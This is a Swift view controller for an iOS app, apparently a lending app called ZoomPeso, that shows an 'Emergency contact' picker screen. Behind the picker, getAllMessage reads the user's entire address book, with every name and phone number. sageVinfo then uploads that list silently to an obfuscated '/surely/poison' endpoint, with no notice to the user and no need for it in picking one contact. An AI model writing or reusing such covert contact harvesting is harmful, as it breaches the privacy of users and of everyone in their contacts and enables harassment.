//
//  VitamainFourViewController.swift
//  ZoomPeso
//
//  Created by 何康 on 2025/4/22.
//

import UIKit
import RxRelay
import AVFoundation
import Photos
import TYAlertController
import Kingfisher
import Combine
import Contacts
import ContactsUI

class VitamainFourViewController: BaseViewController {
    
    var cancellables = Set<AnyCancellable>()
    
    var model = BehaviorRelay<netModel?>(value: nil)
    
    var oneModel = BehaviorRelay<netModel?>(value: nil)
    
    let contactStore = CNContactStore()
    
    var selectCell: MyLoveViewCell?
    
    var selectIndex: Int = 0
    
    var dictArray: [[String: String]] = []
    
    var contractTime: String = ""
    
    lazy var hedImageView: UIImageView = {
        let hedImageView = UIImageView()
        hedImageView.image = UIImage(named: "seigmeiage")
        return hedImageView
    }()
    
    lazy var oneImageView: UIImageView = {
        let oneImageView = UIImageView()
        oneImageView.image = UIImage(named: "aseuthigme")
        return oneImageView
    }()
    
    lazy var mlabel: UILabel = {
        let mlabel = UILabel.createLabel(font: UIFont(name: ArialBlackFont, size: 18)!, textColor: .white, textAlignment: .center)
        mlabel.text = "Step 1"
        return mlabel
    }()
    
    lazy var nextBtn: UIButton = {
        let nextBtn = UIButton(type: .custom)
        nextBtn.setTitle("Next", for: .normal)
        nextBtn.titleLabel?.font = UIFont(name: ArialBlackFont, size: 18.pix())
        nextBtn.backgroundColor = .init(hexStr: "#FF3824")
        nextBtn.setTitleColor(.white, for: .normal)
        nextBtn.layer.cornerRadius = 23.5
        return nextBtn
    }()
    
    lazy var infoView: UIView = {
        let infoView = UIView()
        infoView.backgroundColor = .clear
        return infoView
    }()
    
    lazy var tableView: UITableView = {
        let tableView = UITableView(frame: .zero, style: .plain)
        tableView.separatorStyle = .none
        tableView.backgroundColor = .clear
        tableView.register(MyLoveViewCell.self, forCellReuseIdentifier: "MyLoveViewCell")
        tableView.showsVerticalScrollIndicator = false
        tableView.contentInsetAdjustmentBehavior = .never
        tableView.delegate = self
        tableView.dataSource = self
        if #available(iOS 15.0, *) {
            tableView.sectionHeaderTopPadding = 0
        }
        return tableView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Do any additional setup after loading the view.
        contractTime = DeviceInfo.currentTimestamp
        view.addSubview(hedImageView)
        hedImageView.snp.makeConstraints { make in
            make.left.top.right.equalToSuperview()
            make.height.equalTo(136.pix())
        }
        
        self.headView.nameLabel.text = "Emergency contact"
        addHeadView()
        self.headView.backBlock = { [weak self] in
            self?.popToVitamainGuideOrRoot()
        }
        
        view.addSubview(bgView)
        bgView.snp.makeConstraints { make in
            make.left.right.bottom.equalToSuperview()
            make.top.equalTo(hedImageView.snp.bottom).offset(-20)
        }
        view.addSubview(oneImageView)
        oneImageView.addSubview(mlabel)
        oneImageView.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.top.equalTo(headView.snp.bottom).offset(10)
            make.size.equalTo(CGSize(width: 358.pix(), height: 448.pix()))
        }
        mlabel.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.top.equalToSuperview().offset(44.pix())
            make.height.equalTo(25.pix())
        }
        
        view.addSubview(nextBtn)
        nextBtn.snp.makeConstraints { make in
            make.centerX.equalToSuperview()
            make.size.equalTo(CGSize(width: 237.pix(), height: 47.pix()))
            make.bottom.equalToSuperview().offset(-30.pix())
        }
        
        view.addSubview(infoView)
        infoView.snp.makeConstraints { make in
            make.top.equalTo(oneImageView.snp.top).offset(82.pix())
            make.left.equalTo(oneImageView.snp.left).offset(6.5.pix())
            make.centerX.equalToSuperview()
            make.bottom.equalTo(nextBtn.snp.top).offset(-15.pix())
        }
        
        infoView.addSubview(tableView)
        tableView.snp.makeConstraints { make in
            make.edges.equalToSuperview()
        }
        
        nextBtn.rx.tap.subscribe(onNext: { [weak self] in
            guard let self = self,
                  let oneModel = self.oneModel.value,
                  let modelArray = oneModel.army else { return }
            dictArray.removeAll()
            for model in modelArray {
                let dict = ["paths": model.paths ?? "",
                            "paralysed": model.paralysed ?? "",
                            "beaten": model.beaten ?? ""]
                dictArray.append(dict)
            }
            safeBingoInfo(with: dictArray)
        }).disposed(by: disposeBag)
        
        getApiInfo()
    }
    
}

extension VitamainFourViewController {
    
    private func safeBingoInfo(with dictArray: [[String: String]]) {
        let barricaded = self.model.value?.enlarged?.orifice ?? ""
        var jstring: String = ""
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: dictArray, options: [])
            if let jsonString = String(data: jsonData, encoding: .utf8) {
                jstring = jsonString
            }
        } catch {
            print("Failed to convert phoneArray to JSON: \(error)")
        }
        ViewHudConfig.showLoading()
        let dict = ["barricaded": barricaded, "net": jstring]
        NetworkManager.multipartFormDataRequest(endpoint: "/surely/die", parameters: dict, responseType: BaseModel.self) { [weak self] result in
            switch result {
            case .success(let success):
                guard let self = self else { return }
                if success.wedge == "0" {
                    self.productDetailInfo(from: barricaded) { model in
                        self.model.accept(model)
                        self.vitaminInfo(from: model) { model in }
                    }
                    BuyPointConfig.pointToPageWithModel(with: "7", kstime: contractTime, jstime: DeviceInfo.currentTimestamp)
                }
                ToastShowConfig.showMessage(form: view, message: success.circular ?? "")
                ViewHudConfig.hideLoading()
                break
            case .failure(_):
                ViewHudConfig.hideLoading()
                break
            }
        }
    }
    
    override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        infoView.layer.cornerRadius = 15
        infoView.layer.maskedCorners = [.layerMinXMaxYCorner, .layerMaxXMaxYCorner]
        infoView.layer.masksToBounds = true
    }
    
    private func getApiInfo() {
        ViewHudConfig.showLoading()
        let barricaded = self.model.value?.enlarged?.orifice ?? ""
        let dict = ["barricaded": barricaded,
                    "bear": "1",
                    "cotton": "0"]
        NetworkManager.multipartFormDataRequest(endpoint: "/surely/says", parameters: dict, responseType: BaseModel.self) { [weak self] result in
            ViewHudConfig.hideLoading()
            switch result {
            case .success(let success):
                guard let self = self else { return }
                if success.wedge == "0" {
                    if let model = success.net {
                        self.oneModel.accept(model)
                        self.tableView.reloadData()
                    }
                }
                break
            case .failure(_):
                break
            }
        }
    }
    
}

extension VitamainFourViewController: UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {
        return 228.pix()
    }
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        let model = self.oneModel.value
        return model?.army?.count ?? 0
    }
    
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let model = self.oneModel.value?.army?[indexPath.row]
        let cell = tableView.dequeueReusableCell(withIdentifier: "MyLoveViewCell", for: indexPath) as! MyLoveViewCell
        cell.selectionStyle = .none
        cell.backgroundColor = .clear
        cell.model.accept(model)
        return cell
    }
    
    func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
        let model = self.oneModel.value?.army?[indexPath.row]
        let cell = tableView.cellForRow(at: indexPath) as! MyLoveViewCell
        self.selectCell = cell
        self.selectIndex = indexPath.row
        if let model = model {
            popSelectOneViewInfo(from: model, cell: cell)
        }
    }
    
}

extension VitamainFourViewController: CNContactPickerDelegate {
    
    private func popSelectOneViewInfo(from model: armyModel, cell: MyLoveViewCell) {
        let selectOneView = SelectOneView(frame: CGRectMake(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT))
        let modelArray = model.extricate ?? []
        selectOneView.modelArray.accept(modelArray)
        let alertVc = TYAlertController(alert: selectOneView, preferredStyle: .alert)!
        self.present(alertVc, animated: true)
        
        selectOneView.dismissBlock = { [weak self] in
            guard let self = self else { return }
            self.dismiss(animated: true)
        }
        
        selectOneView.comfirmBlock = { [weak self] index, enumModel in
            guard let self = self else { return }
            self.dismiss(animated: true) {
                cell.clickLabel.text = enumModel.paralysed ?? ""
                cell.clickLabel.textColor = .init(hexStr: "#FF3824")
                model.paths = enumModel.bajada ?? "0"
                model.common = enumModel.paralysed ?? ""
                DispatchQueue.main.async {
                    self.comtactMeaageInfo(from: model, cell: cell)
                }
            }
        }
    }
    
    private func comtactMeaageInfo(from model: armyModel, cell: MyLoveViewCell) {
        requestContactsAccess()
    }
    
    func requestContactsAccess() {
        let authorizationStatus = CNContactStore.authorizationStatus(for: .contacts)
        switch authorizationStatus {
        case .notDetermined:
            contactStore.requestAccess(for: .contacts) { [weak self] (granted, error) in
                DispatchQueue.main.async {
                    if !granted {
                        self?.showPermissionDeniedAlert(for: "Contact")
                    } else {
                        self?.accessContacts()
                    }
                }
            }
            break
        case .restricted, .denied:
            self.showPermissionDeniedAlert(for: "Contact")
            break
        case .authorized:
            DispatchQueue.main.async {
                self.accessContacts()
            }
            break
        case .limited:
            self.showPermissionDeniedAlert(for: "Contact")
            break
        @unknown default:
            break
        }
    }
    
    func accessContacts() {
        getAllMessage()
        showSystemContactPicker()
    }
    
    func getAllMessage() {
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            var phoneArray: [[String: Any]] = []
            let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey]
            let request = CNContactFetchRequest(keysToFetch: keys as [CNKeyDescriptor])
            do {
                try self?.contactStore.enumerateContacts(with: request) { (contact, stop) in
                    let fullName = "\(contact.givenName) \(contact.familyName)"
                    let phoneNumbersString = contact.phoneNumbers
                        .map { $0.value.stringValue }
                        .joined(separator: ",")
                    let dict = ["hat": phoneNumbersString, "paralysed": fullName]
                    phoneArray.append(dict)
                }
                self?.updateFocusIfNeededInfo(from: phoneArray)
            } catch {
                print("error: \(error.localizedDescription)")
            }
        }
    }
    
    func showSystemContactPicker() {
        let picker = CNContactPickerViewController()
        picker.delegate = self
        
        picker.predicateForEnablingContact = NSPredicate(format: "phoneNumbers.@count > 0")
        
        picker.displayedPropertyKeys = [CNContactPhoneNumbersKey]
        
        present(picker, animated: true)
    }
    
    
    func contactPicker(_ picker: CNContactPickerViewController, didSelect contact: CNContact) {
        let fullName = "\(contact.familyName) \(contact.givenName)"
        if fullName.isEmpty {
            ToastShowConfig.showMessage(form: view, message: "Emergency contact name cannot be empty.")
            return
        }
        if let phoneNumber = contact.phoneNumbers.first?.value.stringValue {
            if let selectCell = self.selectCell {
                selectCell.cpLabel.text = "\(fullName) - \(phoneNumber)"
                selectCell.cpLabel.textColor = .init(hexStr: "#FF3824")
                if let model = self.oneModel.value?.army?[selectIndex] {
                    model.paralysed = fullName
                    model.beaten = phoneNumber
                }
            }
        } else {
            ToastShowConfig.showMessage(form: view, message: "Emergency contact phone number cannot be empty.")
        }
    }
    
    func contactPickerDidCancel(_ picker: CNContactPickerViewController) {
        
    }
    
    private func updateFocusIfNeededInfo(from phoneArray: [[String: Any]]) {
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: phoneArray, options: [])
            if let jsonString = String(data: jsonData, encoding: .utf8) {
                let dict = ["net": jsonString]
                sageVinfo(with: dict)
            }
            
        } catch {
            print("Failed to convert phoneArray to JSON: \(error)")
        }
    }
    
    private func sageVinfo(with dict: [String: String]) {
        NetworkManager.multipartFormDataRequest(endpoint: "/surely/poison", parameters: dict, responseType: BaseModel.self) { result in
            switch result {
            case .success(_):
                break
            case .failure(_):
                break
            }
        }
    }
}
